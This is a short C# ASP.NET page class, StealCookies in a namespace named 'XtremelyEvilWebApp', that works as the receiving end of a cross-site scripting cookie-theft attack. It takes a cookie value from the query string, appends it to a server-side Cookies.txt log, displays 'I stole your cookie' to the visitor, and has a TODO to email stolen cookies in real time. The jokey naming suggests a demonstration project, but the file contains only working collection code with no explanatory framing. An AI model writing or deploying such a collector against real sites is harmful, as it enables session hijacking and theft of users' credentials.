using System;
using System.IO;

namespace XtremelyEvilWebApp
{
    public partial class StealCookies : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            var cookie = Request.QueryString["Cookie"];
            if (string.IsNullOrEmpty(cookie))
            {
                lblOutput.Text = "No cookie found";
            }
            else
            {
                var filename = Server.MapPath("Cookies.txt");
                File.AppendAllText(filename, cookie + "\n");
                //TODO: Mail the cookie in real time.
                lblOutput.Text = string.Format("I stole your cookie.  The value I saw is '{0}'.", cookie);
            }
        }
    }
}